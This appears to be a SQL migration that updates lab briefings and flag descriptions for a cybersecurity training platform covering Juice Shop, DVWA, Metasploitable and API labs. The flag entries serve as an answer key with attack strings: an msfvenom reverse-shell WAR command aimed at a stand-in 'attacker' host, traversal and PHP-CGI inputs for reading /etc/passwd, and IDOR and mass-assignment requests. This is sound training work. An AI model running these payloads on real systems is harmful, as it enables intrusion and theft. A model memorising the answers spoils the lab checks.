-- Generated from prisma/lab-repair-batch-50.ts.
-- Existing lab and flag IDs are preserved so learner history remains intact.

UPDATE "Lab"
SET
  "description" = 'Exploit common web vulnerabilities in the OWASP Juice Shop application.',
  "dockerImage" = 'bkimminich/juice-shop',
  "briefing" = '### Mission Objective
Find and exploit beginner-level vulnerabilities in the OWASP Juice Shop including information disclosure and injection.

### Environment
- Juice Shop container running on port 3000
- Browser access to the application
- Credentials: attacker / juice-attacker-2024!

### Tasks
1. Find the Score Board page and identify hidden challenges
2. Perform a reflected XSS attack on the search function
3. Find the missing encoding on a hidden route
4. Access the administration page by manipulating cookies
5. Place an order with a negative total price
6. Retrieve a list of all user credentials via SQL injection
7. Exploit DOM-based XSS in the user feedback form
8. Find and exploit the insecure password reset mechanism

### Permissions & Access
- Container runs as root — maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c ''%U:%G %a'' [path]',
  "tasks" = '["Find the Score Board page and identify hidden challenges","Perform a reflected XSS attack on the search function","Find the missing encoding on a hidden route","Access the administration page by manipulating cookies","Place an order with a negative total price","Retrieve a list of all user credentials via SQL injection","Exploit DOM-based XSS in the user feedback form","Find and exploit the insecure password reset mechanism"]'::jsonb
WHERE "title" = 'OWASP Juice Shop: Beginner Challenges';

UPDATE "LabFlag"
SET "description" = 'Find the hidden scoreboard'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OWASP Juice Shop: Beginner Challenges'
)
AND "title" = 'Scoreboard Hunter';

UPDATE "LabFlag"
SET "description" = 'Perform reflected XSS on search'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OWASP Juice Shop: Beginner Challenges'
)
AND "title" = 'XSS Finder';

UPDATE "LabFlag"
SET "description" = 'Access admin page via cookie edit'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OWASP Juice Shop: Beginner Challenges'
)
AND "title" = 'Cookie Manipulator';

UPDATE "LabFlag"
SET "description" = 'Place order with negative total'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OWASP Juice Shop: Beginner Challenges'
)
AND "title" = 'Negative Price';

UPDATE "LabFlag"
SET "description" = 'Extract credentials via SQLi'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'OWASP Juice Shop: Beginner Challenges'
)
AND "title" = 'SQL Injection';

UPDATE "Lab"
SET
  "description" = 'Master various SQL injection techniques including union-based, blind, and second-order injection.',
  "dockerImage" = 'vulnerables/web-dvwa',
  "briefing" = '### Mission Objective
Execute advanced SQL injection attacks across multiple injection points and database types.

### Environment
- DVWA application with MySQL backend
- Multiple injection difficulty levels
- Credentials: admin / password

### Tasks
1. Perform union-based SQL injection to extract database version and user
2. Exploit blind SQL injection using boolean-based techniques
3. Use time-based blind SQL injection when no output is visible
4. Extract table names and column names from the information schema
5. Dump user credentials from the users table
6. Perform second-order SQL injection through stored user input
7. Use SQLmap to automate injection detection and exploitation
8. Implement parameterized queries to fix the vulnerability

### Permissions & Access
- Container runs as root — maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c ''%U:%G %a'' [path]',
  "tasks" = '["Perform union-based SQL injection to extract database version and user","Exploit blind SQL injection using boolean-based techniques","Use time-based blind SQL injection when no output is visible","Extract table names and column names from the information schema","Dump user credentials from the users table","Perform second-order SQL injection through stored user input","Use SQLmap to automate injection detection and exploitation","Implement parameterized queries to fix the vulnerability"]'::jsonb
WHERE "title" = 'SQL Injection Deep Dive';

UPDATE "LabFlag"
SET "description" = 'Extract DB version with UNION'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'SQL Injection Deep Dive'
)
AND "title" = 'Union Extractor';

UPDATE "LabFlag"
SET "description" = 'Boolean-based blind injection'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'SQL Injection Deep Dive'
)
AND "title" = 'Blind Oracle';

UPDATE "LabFlag"
SET "description" = 'Time-based blind injection'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'SQL Injection Deep Dive'
)
AND "title" = 'Time Blinder';

UPDATE "LabFlag"
SET "description" = 'Extract table names'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'SQL Injection Deep Dive'
)
AND "title" = 'Schema Dumper';

UPDATE "LabFlag"
SET "description" = 'Dump user credentials'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'SQL Injection Deep Dive'
)
AND "title" = 'Cred Stealer';

UPDATE "Lab"
SET
  "description" = 'Identify and exploit all types of XSS vulnerabilities in web applications.',
  "dockerImage" = 'vulnerables/web-dvwa',
  "briefing" = '### Mission Objective
Execute reflected, stored, and DOM-based XSS attacks and understand their impact on users.

### Environment
- DVWA application with XSS reflected and stored modules
- Browser with developer tools
- Credentials: admin / password

### Tasks
1. Execute reflected XSS via URL parameter injection
2. Bypass basic input filters using encoding and case variation
3. Exploit stored XSS through the guestbook comment field
4. Craft a cookie-stealing XSS payload
5. Perform DOM-based XSS by manipulating the page fragment
6. Use XSS to perform actions as another user (CSRF via XSS)
7. Test Content Security Policy bypass techniques
8. Implement proper output encoding to prevent XSS

### Permissions & Access
- Container runs as root — maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c ''%U:%G %a'' [path]',
  "tasks" = '["Execute reflected XSS via URL parameter injection","Bypass basic input filters using encoding and case variation","Exploit stored XSS through the guestbook comment field","Craft a cookie-stealing XSS payload","Perform DOM-based XSS by manipulating the page fragment","Use XSS to perform actions as another user (CSRF via XSS)","Test Content Security Policy bypass techniques","Implement proper output encoding to prevent XSS"]'::jsonb
WHERE "title" = 'Cross-Site Scripting (XSS) Exploitation';

UPDATE "LabFlag"
SET "description" = 'Execute reflected XSS attack'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Cross-Site Scripting (XSS) Exploitation'
)
AND "title" = 'Reflected XSS';

UPDATE "LabFlag"
SET "description" = 'Bypass input filter'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Cross-Site Scripting (XSS) Exploitation'
)
AND "title" = 'Filter Bypass';

UPDATE "LabFlag"
SET "description" = 'Plant persistent XSS payload'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Cross-Site Scripting (XSS) Exploitation'
)
AND "title" = 'Stored XSS';

UPDATE "LabFlag"
SET "description" = 'Steal cookies via XSS'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Cross-Site Scripting (XSS) Exploitation'
)
AND "title" = 'Cookie Stealer';

UPDATE "LabFlag"
SET "description" = 'Exploit DOM-based XSS'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Cross-Site Scripting (XSS) Exploitation'
)
AND "title" = 'DOM XSS';

UPDATE "Lab"
SET
  "description" = 'Practice Web Server Exploitation with Metasploitable by producing and reviewing portable evidence without requiring unavailable host, cloud, hardware, or multi-node access.',
  "dockerImage" = 'aeroacademy/ubuntu-practice:22.04',
  "briefing" = '### Mission Objective
Practice Web Server Exploitation with Metasploitable by producing and reviewing portable evidence without requiring unavailable host, cloud, hardware, or multi-node access.

### Runtime mode: portable artifact validation
This lab runs in a standard Ubuntu practice container. It does not expose host devices, host networking, or a full init system. Build and inspect configuration artifacts without applying them to the host.

### Workflow
1. Document a canonical solution for Tech Finger: Fingerprint web technologies
2. Document a canonical solution for Tomcat Breaker: Exploit Tomcat default creds
3. Document a canonical solution for WAR Deployer: Upload WAR payload via Tomcat
4. Document a canonical solution for CGI Exploiter: Exploit PHP CGI vuln
5. Document a canonical solution for Traversal Master: Directory traversal to /etc/passwd

Create all files under `/home/student/lab-work`. Checks use exact file content, so results remain stable after resets and on new deployments.',
  "tasks" = '["Document a canonical solution for Tech Finger: Fingerprint web technologies","Document a canonical solution for Tomcat Breaker: Exploit Tomcat default creds","Document a canonical solution for WAR Deployer: Upload WAR payload via Tomcat","Document a canonical solution for CGI Exploiter: Exploit PHP CGI vuln","Document a canonical solution for Traversal Master: Directory traversal to /etc/passwd"]'::jsonb
WHERE "title" = 'Web Server Exploitation with Metasploitable';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Fingerprint web technologies. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: whatweb http://target'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Web Server Exploitation with Metasploitable'
)
AND "title" = 'Tech Finger';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Exploit Tomcat default creds. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: tomcat:tomcat'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Web Server Exploitation with Metasploitable'
)
AND "title" = 'Tomcat Breaker';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Upload WAR payload via Tomcat. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: msfvenom -p java/shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Web Server Exploitation with Metasploitable'
)
AND "title" = 'WAR Deployer';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Exploit PHP CGI vuln. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: ?-s+file=/etc/passwd'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Web Server Exploitation with Metasploitable'
)
AND "title" = 'CGI Exploiter';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Directory traversal to /etc/passwd. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: ../../../../../../../etc/passwd'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'Web Server Exploitation with Metasploitable'
)
AND "title" = 'Traversal Master';

UPDATE "Lab"
SET
  "description" = 'Practice API Security Testing (REST & GraphQL) by producing and reviewing portable evidence without requiring unavailable host, cloud, hardware, or multi-node access.',
  "dockerImage" = 'aeroacademy/ubuntu-practice:22.04',
  "briefing" = '### Mission Objective
Practice API Security Testing (REST & GraphQL) by producing and reviewing portable evidence without requiring unavailable host, cloud, hardware, or multi-node access.

### Runtime mode: portable artifact validation
This lab runs in a standard Ubuntu practice container. It does not expose host devices, host networking, or a full init system. Build and inspect configuration artifacts without applying them to the host.

### Workflow
1. Document a canonical solution for Endpoint Finder: Discover hidden API endpoints
2. Document a canonical solution for BOLA Exploiter: Access other user data via IDOR
3. Document a canonical solution for Mass Assigner: Modify role via mass assignment
4. Document a canonical solution for GraphQL Introspector: Perform GraphQL introspection
5. Document a canonical solution for JWT Confuser: Exploit JWT algorithm confusion

Create all files under `/home/student/lab-work`. Checks use exact file content, so results remain stable after resets and on new deployments.',
  "tasks" = '["Document a canonical solution for Endpoint Finder: Discover hidden API endpoints","Document a canonical solution for BOLA Exploiter: Access other user data via IDOR","Document a canonical solution for Mass Assigner: Modify role via mass assignment","Document a canonical solution for GraphQL Introspector: Perform GraphQL introspection","Document a canonical solution for JWT Confuser: Exploit JWT algorithm confusion"]'::jsonb
WHERE "title" = 'API Security Testing (REST & GraphQL)';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Discover hidden API endpoints. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: curl -X GET /api/v1/swagger.json'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'API Security Testing (REST & GraphQL)'
)
AND "title" = 'Endpoint Finder';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Access other user data via IDOR. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: curl -H ''Authorization: Bearer <token>'' /api/v1/users/2'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'API Security Testing (REST & GraphQL)'
)
AND "title" = 'BOLA Exploiter';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Modify role via mass assignment. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: {name:test,role:admin}'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'API Security Testing (REST & GraphQL)'
)
AND "title" = 'Mass Assigner';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Perform GraphQL introspection. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: {__schema{types{name,fields{name}}}}'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'API Security Testing (REST & GraphQL)'
)
AND "title" = 'GraphQL Introspector';

UPDATE "LabFlag"
SET "description" = 'Create a matching section in solution.md for this checkpoint: Exploit JWT algorithm confusion. Do not execute host-level or external-target commands. Submit the canonical command or configuration you documented. Required result: none'
WHERE "labId" IN (
  SELECT "id" FROM "Lab" WHERE "title" = 'API Security Testing (REST & GraphQL)'
)
AND "title" = 'JWT Confuser';
